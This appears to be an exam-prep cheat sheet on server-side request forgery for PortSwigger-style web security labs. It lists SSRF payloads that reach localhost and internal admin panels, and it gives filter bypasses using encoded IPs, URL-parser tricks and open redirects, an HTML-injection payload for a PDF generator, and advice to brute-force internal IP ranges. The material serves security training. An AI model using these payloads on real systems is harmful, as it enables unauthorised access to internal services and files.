# SSRF (Server-Side Request Forgery) - Stage 3

## 🎯 Target Locations

1. **Product Stock Check** (`/product/stock`) ⭐⭐⭐
2. **Admin Panel** - "Download report as PDF" feature
3. **HTTP Host Header** (see Host Header attacks)

## ⚠️ CRITICAL EXAM TIP

**On the exam, SSRF can access an internal-only service:**
- **Host:** `localhost` or `127.0.0.1`
- **Port:** `6566`
- **Purpose:** Read files from the system

**Example:**
```
http://localhost:6566/home/carlos/secret
```

## 🔥 Basic SSRF Payloads

### Access Internal Services
```
http://localhost/admin
http://127.0.0.1/admin
http://192.168.0.1/admin
```

### Access Internal File Service (Exam)
```
http://localhost:6566/home/carlos/secret
http://127.0.0.1:6566/home/carlos/secret
```

## 🛡️ Bypass Techniques

### IP Address Encoding

#### Decimal Encoding
```
http://2130706433/admin
```
(127.0.0.1 = 2130706433 in decimal)

#### Hex Encoding
```
http://0x7f.0x0.0x0.0x1/admin
http://0x7f000001/admin
```

#### Octal Encoding
```
http://0177.0.0.01/admin
http://017700000001/admin
```

#### Mixed Encoding
```
http://0177.0.0.0x1/admin
```

**Tool:** [IP Converter](https://h.43z.one/ipconverter/)

---

### DNS-Based Bypass

#### Using Custom Domain
```
http://localtest.me/admin
http://customer1.app.localhost.my-company.com/admin
```

#### Using Burp Collaborator
```
http://burp.oastify.com/
```

---

### URL Parser Bypass

#### Using @ Symbol
```
http://expected-host@localhost/admin
http://localhost#@expected-host/admin
```

#### Using Credentials
```
http://localhost:80@expected-host/admin
```

---

### Open Redirect Bypass
**Scenario:** Whitelist validation on domain

```
/product/stock?stockApi=http://weliketoshop.net/product/nextProduct?path=http://192.168.0.12:8080/admin
```

---

### Blacklist Bypass

#### Alternative Localhost Representations
```
127.1
127.0.1
127.00.00.01
localhost
localtest.me
```

#### IPv6
```
http://[::1]/admin
http://[::ffff:127.0.0.1]/admin
```

#### Domain Variations
```
127.0.0.1.nip.io
127.0.0.1.xip.io
```

---

### Whitelist Bypass

#### Using @ Symbol
```
http://expected-host@localhost/
```

#### Using # Fragment
```
http://localhost#expected-host
```

#### Using Subdomain
```
http://expected-host.localhost/
```

## 📋 Lab Examples

### Lab 1: Basic SSRF Against Back-End System
**Scenario:** Access admin panel on internal network

```
stockApi=http://192.168.0.1:8080/admin
```

Brute force last octet (1-255) to find admin panel.

---

### Lab 2: Blacklist-Based Input Filter
**Scenario:** `localhost` and `127.0.0.1` blocked

**Bypass:**
```
stockApi=http://127.1/admin
stockApi=http://2130706433/admin
```

---

### Lab 3: Whitelist-Based Input Filter
**Scenario:** Must contain `stock.weliketoshop.net`

**Bypass:**
```
stockApi=http://localhost%2523@stock.weliketoshop.net/admin
```
(`%2523` = double-encoded `#`)

---

### Lab 4: Filter Bypass via Open Redirection
**Scenario:** Whitelist validation, but open redirect exists

```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

---

### Lab 5: Blind SSRF with Out-of-Band Detection
**Scenario:** No response, use Burp Collaborator

```
Referer: http://burp.oastify.com
```

---

### Lab 6: Admin Panel - Download Report as PDF SSRF
**Scenario:** PDF generation fetches external resources

**Payload in HTML:**
```html
<img src="http://localhost:6566/home/carlos/secret">
```

## 🎓 Exam Tips

1. **Check stock check functionality** - Most common SSRF location
2. **Try port 6566 on localhost** - Exam-specific internal service
3. **Use IP encoding** - Bypass blacklists
4. **Look for admin panel PDF features** - SSRF via HTML injection
5. **Test Referer header** - Sometimes vulnerable to SSRF
6. **Brute force internal IPs** - `192.168.0.1-255`

## 🔍 Testing Workflow

### Step 1: Identify SSRF
```
stockApi=http://burp.oastify.com
```
Check Burp Collaborator for callback.

### Step 2: Access Internal Services
```
stockApi=http://localhost/admin
stockApi=http://127.0.0.1/admin
```

### Step 3: Access File Service (Exam)
```
stockApi=http://localhost:6566/home/carlos/secret
```

### Step 4: Bypass Filters
If blocked, try:
- IP encoding: `http://2130706433:6566/home/carlos/secret`
- Alternative localhost: `http://127.1:6566/home/carlos/secret`

## 🔗 Quick Reference

| Bypass Type | Example |
|-------------|---------|
| Decimal IP | `http://2130706433/` |
| Hex IP | `http://0x7f000001/` |
| Octal IP | `http://017700000001/` |
| Alternative localhost | `http://127.1/` |
| IPv6 | `http://[::1]/` |
| @ symbol | `http://expected@localhost/` |
| # fragment | `http://localhost#expected` |
| Open redirect | `/next?path=http://internal/` |

## 📚 References

- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [IP Converter Tool](https://h.43z.one/ipconverter/)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
